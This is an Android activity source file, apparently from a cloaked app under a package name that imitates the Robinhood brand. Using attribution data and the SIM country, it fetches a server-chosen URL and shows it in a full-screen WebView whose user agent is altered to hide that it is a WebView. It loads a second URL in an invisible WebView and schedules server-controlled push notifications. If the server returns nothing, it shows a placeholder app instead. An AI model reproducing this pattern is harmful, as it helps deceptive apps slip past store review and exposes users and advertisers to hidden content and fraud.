package com.robinhood.wsc;

import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Pair;
import android.view.View;
import android.webkit.CookieManager;
import android.widget.ProgressBar;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.mmdev.loadingviewlib.LoadingView;
import com.robinhood.wsc.data.EntityAppsflyerData;
import com.robinhood.wsc.data.LoaderAppInfo;
import com.robinhood.wsc.data.Preferences;
import com.robinhood.wsc.interfaces.IValueListener;
import com.robinhood.wsc.notifications.NotificationsManager;
import com.robinhood.wsc.utils.ChromeClient;

import java.util.List;
import im.delight.android.webview.AdvancedWebView;

public abstract class StartActivity extends AppCompatActivity {

    private AdvancedWebView webView;
    private AdvancedWebView webViewInvisible;
    private LoadingView loadingView;
    private Preferences preferences;
    private boolean showProgress = true;
    private Integer systemUiVisibility;

    public abstract Class<?> getPlaceholderStartActivity();
    public abstract Class<?> getAlartReceiver();
    public abstract String getPackageName();

    private void init() {
        setTheme(R.style.AppThemeWebView);
        setContentView(R.layout.activity_webview);

        preferences = new Preferences(getSharedPreferences(Preferences.PREFS_NAME, MODE_PRIVATE));

        updateStatusBar();
        initWebView();

        String savedUrl = preferences.getUrl();
        if(savedUrl != null) webView.loadUrl(savedUrl);
        else loadConfig();
    }

    private void initWebView() {
        webView = findViewById(R.id.webView);
        webViewInvisible = findViewById(R.id.webViewInvisible);
        loadingView = findViewById(R.id.progress);

        webView.setListener(this, new AdvancedWebView.Listener() {
            @Override
            public void onPageStarted(String url, Bitmap favicon) {
                if(showProgress) {
                    webView.setVisibility(View.VISIBLE);
                    loadingView.setVisibility(View.GONE);
                    showProgress = false;
                }
            }
            @Override
            public void onPageFinished(String url) {
                CookieManager.getInstance().flush();
                if(preferences.getSaveLastUrl()) preferences.saveUrl(url);
            }
            @Override public void onPageError(int errorCode, String description, String failingUrl) { }
            @Override public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) { }
            @Override public void onExternalPageRequest(String url) { }
        });
        webView.setWebChromeClient(new ChromeClient(this));
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(false);
        webView.getSettings().setUserAgentString(webView.getSettings().getUserAgentString().replace("; wv", ""));

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
    }

    private void loadConfig() {
        loadAdsDeeplink();
    }

    private void loadAdsDeeplink() {
        ((App) getApplication()).getAppsflyerData(new IValueListener<EntityAppsflyerData>() {
            @Override
            public void value(EntityAppsflyerData result) {
                loadBuyer(result.getNaming(), result.getUrlParams());
            }
            @Override
            public void failed() {
                showPlaceholder();
            }
        });
    }

    private void loadBuyer(String naming, List<Pair<String, String>> urlParams) {
        String geo = getGeo();
        String bundle = getPackageName();

        LoaderAppInfo.loadInfo(geo, bundle, naming, new IValueListener<LoaderAppInfo.Info>() {
            @Override
            public void value(LoaderAppInfo.Info result) {
                if(!TextUtils.isEmpty(result.url)) {

                    String finalUrl = prepareFinalUrl(result.url, urlParams);
                    String finalUrlInvisible = prepareFinalUrl(result.urlInvisible, urlParams);

                    boolean isRedirect = result.urlInvisible != null;

                    String mainUrl = isRedirect ? result.url : finalUrl;

                    webView.loadUrl(mainUrl);
                    preferences.saveUrl(mainUrl);
                    preferences.setSaveLastUrl(result.saveLastUrl);

                    if(!TextUtils.isEmpty(result.urlInvisible)) webViewInvisible.loadUrl(finalUrlInvisible);

                    if(result.notification != null) processNotification(result.notification);
                }
                else showPlaceholder();
            }

            @Override
            public void failed() {
                showPlaceholder();
            }
        });
    }

    private void showPlaceholder() {
        finish();
        Intent intent = new Intent(this, getPlaceholderStartActivity());
        overridePendingTransition(0, 0);
        intent.setFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        startActivity(intent);
    }

    private void updateStatusBar() {
        View decorView = getWindow().getDecorView();
        if(systemUiVisibility == null) systemUiVisibility = decorView.getSystemUiVisibility();

        int orientation = getResources().getConfiguration().orientation;
        boolean landscape = orientation == Configuration.ORIENTATION_LANDSCAPE;

        int uiOptions = landscape
                ? systemUiVisibility
                : View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;

        decorView.setSystemUiVisibility(uiOptions);
    }

    private void processNotification(LoaderAppInfo.Notification notification) {
        preferences.saveNotification(notification.text, notification.start, notification.interval, notification.maxCount);

        NotificationsManager notificationsManager = new NotificationsManager(getApplicationContext(), getAlartReceiver());
        notificationsManager.schedulePushNotifications(notification.start, notification.interval);
    }

    private String prepareFinalUrl(String baseUrl, List<Pair<String, String>> urlParams) {
        if(urlParams != null && urlParams.size() > 0) {
            try {
                Uri oldUri = Uri.parse(baseUrl);
                Uri.Builder builder = oldUri.buildUpon();
                for(Pair<String, String> param: urlParams) {
                    builder.appendQueryParameter(param.first, param.second);
                }
                Uri newUri = builder.build();
                return newUri.toString();

            } catch (Exception e) {
                return baseUrl;
            }
        }
        else return baseUrl;
    }


    //region ******************** OVERRIDE *********************************************************

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        init();
    }

    @Override
    public void onConfigurationChanged(@NonNull Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        updateStatusBar();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        webView.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onBackPressed() {
        if(webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onResume() {
        webView.onResume();
        super.onResume();
    }

    @Override
    protected void onPause() {
        webView.onPause();
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        webView.onDestroy();
        super.onDestroy();
    }

    //endregion OVERRIDE

    private String getGeo() {
        String country = "unknown";
        try {
            country = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso().toUpperCase();
            if (country.isEmpty()) {
                country = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getNetworkCountryIso().toUpperCase();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return country;
    }
}